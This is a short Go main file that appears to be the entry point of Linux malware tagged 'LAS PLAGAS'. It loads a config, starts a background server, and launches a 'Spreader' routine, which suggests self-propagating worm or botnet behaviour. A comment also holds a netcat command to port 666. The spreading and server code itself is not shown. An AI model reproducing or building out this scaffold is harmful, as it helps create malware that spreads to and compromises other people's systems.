package main

import (
	"path"
)

// nc localhost 666
func main() {
	loadConfig(Options, path.Join("assets", "config.toml"))

	go Server()

	// LAS PLAGAS
	go Spreader()
	// glory 2 las plagas!! : x64 : key: {key} : os: linux

	select {}
}
